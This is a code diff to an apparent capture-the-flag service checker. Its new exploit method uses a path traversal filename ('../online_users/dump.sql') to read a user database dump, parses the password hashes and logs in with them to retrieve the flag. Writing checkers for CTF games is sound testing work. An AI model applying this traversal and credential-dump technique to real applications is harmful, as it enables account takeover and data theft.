@@ -18,6 +18,18 @@ def get_random_string():
     return ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
 
 
+def tuple_string_to_list(test_str):
+    res = []
+    temp = []
+    for token in test_str.split(","):
+        num = str(token.replace("(", "").replace(")", ""))
+        temp.append(num)
+        if ")" in token:
+            res.append(tuple(temp))
+            temp = []
+    return res
+
+
 class testifyChecker(BaseChecker):
     """
     Change the methods given here, then simply create the class and .run() it.
@@ -78,6 +90,10 @@ class testifyChecker(BaseChecker):
             raise BrokenServiceException("could not login user at service")
 
     def make_appointment(self, flag, filename, username, password):
+        """
+        makes appointment using flag as prename, filename
+        returns appointment id
+        """
         self.register(username, password)
         data = {
             'prename': flag,
@@ -382,8 +398,39 @@ class testifyChecker(BaseChecker):
                 If nothing is returned, the service status is considered okay.
                 The preferred way to report Errors in the service is by raising an appropriate EnoException
         """
-        # TODO: We still haven't decided if we want to use this function or not. TBA
-        pass
+        filename = '../online_users/dump.sql'
+        username = get_random_string()
+        password = get_random_string()
+        self.register(username, password)
+
+        app_id = self.make_appointment(self.flag, filename, username, password)
+        route = '/get_id' + str(app_id)
+
+        kwargs = {
+            'allow_redirects': True
+        }
+
+        res = self.http_get(route, **kwargs)
+        sql_string = res.content[27:-2].decode('ascii')
+        user_list = tuple_string_to_list(sql_string)
+        tested = False
+        for i in user_list:
+            user = (i[1])[1:-1]
+            hash = (i[2])[2:]
+            if user == username:
+                kwargs2 = {
+                    'data': {
+                        'username': user,
+                        'password': base64.b64encode(bytes.fromhex(hash)).decode('ascii'),
+                        'login': 'signin'
+                    }
+                }
+
+                res2 = self.http_post('/login', **kwargs2)
+                assert_in(self.flag, res2.text, "Resulting flag was found to be incorrect")
+                tested = True
+        if not tested:
+            raise BrokenServiceException("flag not found")
 
 
 app = testifyChecker.service  # This can be used for uswgi.
